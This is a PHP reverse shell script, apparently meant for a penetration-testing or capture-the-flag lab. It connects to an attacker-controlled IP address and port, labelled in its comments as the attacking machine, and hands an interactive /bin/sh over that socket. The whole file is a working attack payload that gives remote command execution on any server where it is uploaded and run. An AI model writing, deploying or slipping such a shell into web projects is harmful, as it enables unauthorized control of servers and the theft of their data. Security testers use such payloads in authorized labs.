<?php
// Set your attacking machine's IP and port
$ip = '10.10.14.116';  // Replace with your IP
$port = 6001;        // Replace with your port

// Create socket connection
$sock = fsockopen($ip, $port);
$proc = proc_open("/bin/sh -i", array(
  0 => $sock,  // STDIN
  1 => $sock,  // STDOUT
  2 => $sock   // STDERR
), $pipes);
?>